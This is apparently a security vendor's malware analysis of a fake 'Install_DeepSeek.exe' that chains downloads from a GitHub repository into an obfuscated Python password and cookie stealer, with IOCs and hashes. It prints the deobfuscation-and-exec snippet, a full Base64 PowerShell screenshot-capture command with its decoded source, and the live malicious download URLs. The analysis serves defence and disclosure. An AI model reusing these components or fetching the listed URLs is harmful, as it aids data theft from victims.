---
title: Beware, Hackers Leverage DeepSeek Trend to Distribute Phishing Files like fake DeepSeek Installer and Deploy Backdoor Trojans to Steal User Passwords
date: 2023-05-27 12:00:00
tags:
---


# Background

During our routine sample patrol, we discovered a suspicious sample named `Install_DeepSeek.exe` being distributed today, as shown in the image below:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/172639de4fohezds6eohfa.png)

This sample masquerades under the DeepSeek icon, has no valid digital signature, and its pdb path is `C:\Users\Administrator\source\repos\Bind\Bind\obj\Release\Bind.pdb` which raised our alert and suspicion, as illustrated in the following image:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/172651we9eesxh1uae7eus.png)

After analysis, we confirmed that this sample downloads multi-layer scripts and downloaders from a hacker's GitHub repository, utilizing nested downloads. Ultimately, it obtains a malicious script written in Python for executing backdoor actions and stealing passwords. As of the writing of this report, this Python script was first uploaded to the VirusTotal multi-engine scanning platform, where it registered a static detection rate of %, as shown in the image below:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/173519r1qwnwz9uwtb3iiu.png)

Additionally, we found that the hacker's GitHub account hosts multiple similar repositories, all of which uploaded malware several months or weeks ago, as demonstrated in the following image:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/173543tomzgzny76ybzqov.jpg)


# Sample Analysis

The main behavior of `Install_DeepSeek.exe` is to download `https://github.com/nvslks/g/raw/refs/heads/g/g.zip` as shown in the image below:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/173634f27e5heu6xe67w5w.png)

In the repository at `https://github.com/nvslks/g` there is a `Bind.exe` which, after analysis, was confirmed to exhibit behavior essentially consistent with the aforementioned `Install_DeepSeek.exe` as illustrated in the following image:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/173659xo6oyc7wazw6c5ic.png)

After downloading `g.zip` for analysis, we discovered that it contained a `g.bat` file, as shown in the image below:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/173841ctbsrmaspmsislq1.png)

The actions of `g.bat` are as follows:
1. Download `https://github.com/nvslks/g/raw/refs/heads/g/1.zip`
2. Save the downloaded file as `%TEMP%\4g5h790g2345h789g2345h90g2345h-890v2345hf789-3v5h.zip`
3. Use PowerShell to extract `%TEMP%\4g5h790g2345h789g2345h90g2345h-890v2345hf789-3v5h.zip` to `%TEMP%`
4. Hide the execution of PowerShell, launch `%TEMP%\1.bat` and then exit, as shown in the image below:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174245k2bswqj3escsmjss.png)

Inside `1.zip` we found that it contained a Python environment, as shown in the image below:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174405dtagtqo7t9b2gjgb.png)

The disguised `svchost.exe` in the compressed package is identified as the `Python 3.11.150.1013` interpreter, as illustrated in the image below:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174438t9z2w8b5va2mstv2.png)
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174445i6vec5ivfedd9vdz.png)

The purpose of `1.bat` is to use the bundled Python interpreter to execute `python.py` located in the same directory, as shown in the image below:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174515nsxycrsjwsnv1zzm.png)

The core component of this malware is the `python.py` file, which we proceeded to analyze. Upon entering `python.py`, we found that the code may have undergone obfuscation or minimization, making it difficult to read directly, as shown in the image below:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174556ol88mcttjka9ol42.png)
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174612ei93whay9qe8qw89.png)

The sample converts the code characters into numbers in a list and stores this list in the variable `xlicesvaoy` During execution, the original code is restored using the following code:
```
xlicesvaoy = ''.join([chr(int(x) - 79) for x in xlicesvaoy])  // Restore the numbers in the list to code characters
exec(xlicesvaoy)  // Execute the code in the current xlicesvaoy variable directly using the exec() function
```

We can copy the `xlicesvaoy` list and execute `decoded = ''.join(chr(int(n)-79) for n in xlicesvaoy)`. By outputting or writing `decoded` to a file, we can obtain the readable code of the Python script.
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174717otz112tftvp12qt2.png)

The constants in the code are shown below (the logic of the subsequent Trojan code may be seen later, so they are presented here in advance):
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174734jr34ifvmtl4470jm.png)

Upon entering the code, the first noticeable thing is a collection of `browser_paths` as shown in the image below:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174801v9tai8nrgi0pt8ej.png)
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174808bb4cz9gr4f5okmrm.png)

Following this is the `class Maincookie` which contains functions that search for the locations of browsers and their `User Data`. It attempts to terminate any running browser processes using the command line `taskkill /f /im ProcessName`; the command line parameters specify the User Data directory and start the browser processes in debug mode. The code extracts and saves browser cookies, compresses them into a zip file (using the country and IP address as the zip file name), and uploads the file to the hacker. The relevant code is shown in the image below:
![](https://s21.ax1x.com/2025/02/14/pEKE4e0.png)

The next class, `class Variables`, is used to initialize variables. From the variable names, we can see that this backdoor Trojan attempts to obtain browser cookies, browser history, browser download records, bookmarks, Wi-Fi SSIDs and passwords, system information, clipboard content, process lists, and tokens for various social media and gaming platforms, as shown in the image below:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/175827n1m11m8cjf9f4m1h.png)

The functions under `class SubModules` primarily perform various encryption and decryption operations (e.g., decrypting passwords), create mutexes, and determine whether the current state has administrative privileges, with the relevant code illustrated in the image below:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/175841dybhz88k3y308leh.png)

Next, we examine the functions under `class StealSystemInformation`:
1. The function `GetDefaultSystemEncoding(self)` executes the `chcp` command in `cmd.exe` to obtain the encoding method of the current system's command line output.
2. The function `StealSystemInformation(self)` executes commands to retrieve and output `System Info` (systeminfo), `tasklist` (process list), `tasklist /svc` (relationship between processes and services), `ipconfig` (TCP/IP configuration settings), `ipconfig/all` (detailed TCP/IP configuration), `Route Table` (routing table), `route print` (all entries in the current routing table), `Firewallinfo` (firewall information) and so on.
3. The function `StealProcessInformation(self)` retrieves a list format of the current process list by executing the "tasklist /FO LIST" command.
4. The function `StealLastClipBoard(self)` obtains the current clipboard content by executing the `Get-Clipboard` command in PowerShell.
5. The function `StealNetworkInformation(self)` gathers information such as IP address, country, city, timezone, and ISP.
6. The function `StealWifiInformation(self)` acquires local WLAN information, including Wi-Fi SSID and password.

The relevant code is shown in the image below:
![](https://s21.ax1x.com/2025/02/14/pEKEfLq.png)

The core implementation of the Trojan program is located under `class Main`. The Main class contains a large number of variables and functions, and I will not detail them one by one. The outline of the Main class structure is illustrated in the image below:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/181445jrdm3dlrsvnl6v1j.png)

It is particularly noteworthy that the Trojan captures screenshots within the "WriteToText(self)" function of the Main class by executing a Base64-encoded PowerShell command:
```
command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAUwBjAHIAZQBlAG4AcwBoAG8AdAANAAoAewANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AIABDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAHIAZQBzAHUAbAB0AHMAIAA9ACAAbgBlAHcAIABMAGkAcwB0ADwAQgBpAHQAbQBhAHAAPgAoACkAOwANAAoAIAAgACAAIAAgACAAIAAgAHYAYQByACAAYQBsAGwAUwBjAHIAZQBlAG4AcwAgAD0AIABTAGMAcgBlAGUAbgAuAEEAbABsAFMAYwByAGUAZQBuAHMAOwANAAoAIAAgACAAIAAgACAAIAAgAGYAbwByAGUAYQBjAGgAIAAoAFMAYwByAGUAZQBuACAAcwBjAHIAZQBlAG4AIABpAG4AIABhAGwAbABTAGMAcgBlAGUAbgBzACkADQAKACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AHIAeQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAGUAYwB0AGEAbgBnAGwAZQAgAGIAbwB1AG4AZABzACAAPQAgAHMAYwByAGUAZQBuAC4AQgBvAHUAbgBkAHMAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEIAaQB0AG0AYQBwACAAYgBpAHQAbQBhAHAAIAA9ACAAbgBlAHcAIABCAGkAdABtAGEAcAAoAGIAbwB1AG4AZABzAC4AVwBpAGQAdABoACwAIABiAG8AdQBuAGQAcwAuAEgAZQBpAGcAaAB0ACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdQBzAGkAbgBnACAAKABHAHIAYQBwAGgAaQBjAHMAIABnAHIAYQBwAGgAaQBjAHMAIAA9ACAARwByAGEAcABoAGkAYwBzAC4ARgByAG8AbQBJAG0AYQBnAGUAKABiAGkAdABtAGEAcAApACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABnAHIAYQBwAGgAaQBjAHMALgBDAG8AcAB5AEYAcgBvAG0AUwBjAHIAZQBlAG4AKABuAGUAdwAgAFAAbwBpAG4AdAAoAGIAbwB1AG4AZABzAC4ATABlAGYAdAAsACAAYgBvAHUAbgBkAHMALgBUAG8AcAApACwAIABQAG8AaQBuAHQALgBFAG0AcAB0AHkALAAgAGIAbwB1AG4AZABzAC4AUwBpAHoAZQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAcgBlAHMAdQBsAHQAcwA7AA0ACgAgACAAIAAgAH0ADQAKAH0ADQAKACIAQAANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoAJABzAGMAcgBlAGUAbgBzAGgAbwB0AHMAIAA9ACAAWwBTAGMAcgBlAGUAbgBzAGgAbwB0AF0AOgA6AEMAYQBwAHQAdQByAGUAUwBjAHIAZQBlAG4AcwAoACkADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA="
```

The decoded command:
```
$source = @"

using System;

using System.Collections.Generic;

using System.Drawing;

using System.Windows.Forms;

public class Screenshot

{

    public static List<Bitmap> CaptureScreens()

    {

        var results = new List<Bitmap>();

        var allScreens = Screen.AllScreens;

        foreach (Screen screen in allScreens)

        {

            try

            {

                Rectangle bounds = screen.Bounds;

                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))

                {

                    using (Graphics graphics = Graphics.FromImage(bitmap))

                    {

                        graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);

                    }

                    results.Add((Bitmap)bitmap.Clone());

                }

            }

            catch (Exception)

            {

            }

        }

        return results;

    }

}

"@

Add-Type -TypeDefinition $source -ReferencedAssemblies System.Drawing, System.Windows.Forms

$screenshots = [Screenshot]::CaptureScreens()

for ($i = 0; $i -lt $screenshots.Count; $i++){

    $screenshot = $screenshots[$i]

    $screenshot.Save("./Display ($($i+1)).png")

    $screenshot.Dispose()

}
```

The relevant code is shown in the image below:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/181622inolu9u2m2mnzxl0.jpg)

The function `upload_file(file_path)` under `class UploadGoFile` uploads the specified file to the `https://store1.gofile.io/contents/uploadfile`, then retrieves the file sharing link. The program subsequently sends this file sharing link to the hacker. The relevant code is shown in the image below:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/181710e6i2n0m8200rnmli.png)

The functions under `class StealCommonFiles` selectively steal files based on characteristics such as file content, file size, and file extension. These files are compressed into a zip file and uploaded to send to the hacker (using the country, IP address, and the drive letter of the file as the name of the zip file). The relevant code, keywords, and file extensions are illustrated in the image below:
![](https://s21.ax1x.com/2025/02/14/pEKVsn1.png)

The program will directly execute the functions under the `Main` class, `Maincookie` class and "StealCommonFiles().StealFiles()" function upon startup, as shown in the image below:
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/181807lhlqmruulu1m9s6x.png)


### Appendix and IOCs

1. **Assets of Malicious Actors**
     - GitHub Account: https://github.com/nvslks
     - Related GitHub Repositories:
     https://github.com/nvslks/g (the content analyzed in this paper)
     https://github.com/nvslks/h
     https://github.com/nvslks/f
     https://github.com/nvslks/b
     https://github.com/nvslks/a
     https://github.com/nvslks/c
     https://github.com/nvslks/e
     https://github.com/nvslks/d
   - Accessible as of the writing of this article.

2. **Hash (SHA-256) of the Sample Analyzed in This Article**
   Install_DeepSeek.exe - c9d815df845f5e13e8ef1142cb2dec8f97a449d639be2b38bdd75beaacff70b8
   Bind.exe - 9d09a10bfa2aeb89aba5e20e88fb4fc1f56392d859d0592db66221a9f00000c4
   g.bat - 25696f0af2570b4ab6013ff7dcb6995dcfaff31323ad05b268a680a2411ccf0a
   1.bat - 1003d1b243a01a0a518491d0af6c67e33b8d904762b5de167b39acec05ca46f4
   python.py - f6d47d223401627eb4978b7582368854d271d6446b3137dac5ce99cb46efd886
